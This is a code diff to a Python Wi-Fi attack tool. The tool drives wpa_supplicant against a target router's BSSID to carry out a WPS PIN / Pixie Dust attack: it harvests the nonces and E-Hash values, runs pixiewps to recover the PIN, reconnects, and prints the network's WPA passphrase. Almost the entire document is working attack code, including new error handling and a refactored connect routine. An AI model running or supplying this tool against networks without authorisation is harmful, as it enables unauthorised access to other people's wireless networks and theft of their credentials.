@@ -19,6 +19,10 @@ class Data():
         self.state = ''
 
 
+    def clear(self):
+        self.__init__()
+
+
     def got_all(self):
         return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
 
@@ -45,17 +49,22 @@ def shellcmd(cmd):
     return result
 
 
+def recvuntil(pipe, what):
+    s = ''
+    while True:
+        inp = pipe.stdout.read(1)
+        if inp == '': return s
+        s += inp
+        if what in s: return s
+
+
 def run_wpa_supplicant(options):
     options.tempdir = tempfile.mkdtemp()
     with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
         temp.write("ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(options.tempdir))
-        options.tempconf=temp.name
+        options.tempconf = temp.name
     cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(options.interface, options.tempconf)
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
-    while True:
-        s = recvuntil(proc, '\n')
-        if options.verbose: sys.stderr.write(s)
-        if 'update_config=1' in s: break
     return proc
 
 
@@ -74,15 +83,6 @@ def wps_reg(options):
     if 'OK' in proc.stdout:
         status = True
     return status
-
-
-def recvuntil(pipe, what):
-    s = ''
-    while True:
-        inp = pipe.stdout.read(1)
-        if inp == '': return s
-        s += inp
-        if what in s: return s
 
 
 
@@ -112,6 +112,9 @@ def process_wpa_supplicant(pipe, options, data):
         elif 'Received M' in line:
             statechange(data, data.state, 'M' + line.split('Received M')[1])
             print('[*] Received WPS Message {}'.format(data.state))
+        elif 'Received WSC_NACK' in line:
+            statechange(data, data.state, 'WSC_NACK')
+            print('[*] Received WSC NACK')
         elif 'Enrollee Nonce' in line and 'hexdump' in line:
             data.e_nonce = get_hex(line)
             assert(len(data.e_nonce) == 16*2)
@@ -138,12 +141,12 @@ def process_wpa_supplicant(pipe, options, data):
             if options.pixiemode: print('[P] E-Hash2: {}'.format(data.e_hash2))
         elif 'Network Key' in line and 'hexdump' in line:
             data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
+            statechange(data, data.state, 'GOT_PSK')
 
     elif ': State: ' in line:
         statechange(data, *line.split(': State: ')[1].split(' -> '))
     elif 'WPS-FAIL' in line:
-        print("WPS-FAIL :(")
-        return False
+        statechange(data, data.state, 'WPS-FAIL')
 
     elif 'NL80211_CMD_DEL_STATION' in line:
         #if data.state == 'ASSOCIATED':
@@ -159,7 +162,10 @@ def process_wpa_supplicant(pipe, options, data):
         options.essid = line.split("'")[1]
         print('[*] Associating with AP...')
     elif 'Associated with' in line:
-        print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
+        if options.essid:
+            print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
+        else:
+            print('[+] Associated with {}'.format(options.bssid))
     elif 'EAPOL: txStart' in line:
         statechange(data, data.state, 'EAPOL Start')
         print('[*] Sending EAPOL Start...')
@@ -171,16 +177,51 @@ def process_wpa_supplicant(pipe, options, data):
     return True
 
 
-def poll_wpa_supplicant(wpas, options, data, wait_psk=False):
+def poll_wpa_supplicant(wpas, options, data):
     while True:
         res = process_wpa_supplicant(wpas, options, data)
 
         if not res: break
+        if data.state == 'WSC_NACK':
+            print('[-] Error: wrong PIN code')
+            break
+        elif data.state == 'GOT_PSK':
+            break
+        elif data.state == 'WPS-FAIL':
+            print('[-] WPS-FAIL error')
+            break
+    if data.wpa_psk:
+        return True
+    if data.got_all():
+        return True
+    return False
 
-        if data.got_all() and not wait_psk:
-            return True
-        if data.wpa_psk:
-            return True
+
+def connect(options, data):
+    print('[*] Running wpa_supplicant...')
+    wpas = run_wpa_supplicant(options)
+
+    try:
+        while True:
+            s = recvuntil(wpas, '\n')
+            if options.verbose: sys.stderr.write(s)
+            if 'update_config=1' in s: break
+    except KeyboardInterrupt:
+        print("\nAborting...")
+        cleanup(wpas, options)
+        sys.exit(1)
+
+    print('[*] Trying PIN "{}"...'.format(options.pin))
+    wps_reg(options)
+
+    try:
+        res = poll_wpa_supplicant(wpas, options, data)
+    except KeyboardInterrupt:
+        print("\nAborting...")
+        cleanup(wpas, options)
+        sys.exit(1)
+    cleanup(wpas, options)
+    return res
 
 
 def parse_pixiewps(output):
@@ -228,7 +269,7 @@ if __name__ == '__main__':
     optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:Kv", ["help", "interface", "bssid", "pin", "pixie-dust"])
     for a,b in optlist:
         if   a in ('-i', "--interface"): options.interface = b
-        elif a in ('-b', "--bssid"): options.bssid = b
+        elif a in ('-b', "--bssid"): options.bssid = b.upper()
         elif a in ('-p', "--pin"): options.pin = b
         elif a in ('-K', "--pixie-dust"): options.pixiemode = True
         elif a in ('-v'): options.verbose = True
@@ -244,25 +285,16 @@ if __name__ == '__main__':
         die("Run it as root")
 
     data = Data()
-    wpas = run_wpa_supplicant(options)
+    
+    connect(options, data)
 
-    print('[*] Trying pin "{}"...'.format(options.pin))
-    if not wps_reg(options):
-        cleanup(wpas, options)
-        die('Error while launching wpa_cli')
+    if data.wpa_psk:
+        print("[+] WPS PIN: {}".format(options.pin))
+        print("[+] WPA PSK: {}".format(data.wpa_psk))
+        print("[+] AP SSID: {}".format(options.essid))
+        sys.exit(0)
 
-    if not options.pixiemode:
-        wait_psk = True
-    else:
-        wait_psk = False
-    try:
-        poll_wpa_supplicant(wpas, options, data, wait_psk)
-    except KeyboardInterrupt:
-        print("\nAborting...")
-        cleanup(wpas, options)
-        sys.exit(1)
-
-    if data.got_all() and options.pixiemode:
+    elif data.got_all() and options.pixiemode:
         pixiecmd = data.get_pixie_cmd()
         print("Running Pixiewps...")
         if options.verbose: print("Cmd: {}".format(pixiecmd))
@@ -270,36 +302,18 @@ if __name__ == '__main__':
         print(out)
         a = parse_pixiewps(out)
         if a and a != '<empty>':
-            print('Trying to get password with the correct pin...')
-            cleanup(wpas, options)
-            wpas = run_wpa_supplicant(options)
             options.pin = a
-            if not wps_reg(options):
-                cleanup(wpas, options)
-                die('Error while launching wpa_cli')
-            try:
-                poll_wpa_supplicant(wpas, options, data, True)
-            except KeyboardInterrupt:
-                print("\nAborting...")
+            options.pixiemode = False
+            data.clear()
+            print('[*] Trying to get WPA PSK with the correct PIN "{}"...'.format(options.pin))
+
+            connect(options, data)
+
             if data.wpa_psk:
-                cleanup(wpas, options)
                 print("[+] WPS PIN: {}".format(options.pin))
                 print("[+] WPA PSK: {}".format(data.wpa_psk))
                 print("[+] AP SSID: {}".format(options.essid))
                 sys.exit(0)
-            cleanup(wpas, options)
-            sys.exit(1)
-        else:
-            cleanup(wpas, options)
             sys.exit(1)
 
-    if data.wpa_psk:
-        cleanup(wpas, options)
-        print("[+] WPS PIN: {}".format(options.pin))
-        print("[+] WPA PSK: {}".format(data.wpa_psk))
-        print("[+] AP SSID: {}".format(options.essid))
-        sys.exit(0)
-
-    print("hmm, seems something went wrong...")
-    cleanup(wpas, options)
     sys.exit(1)
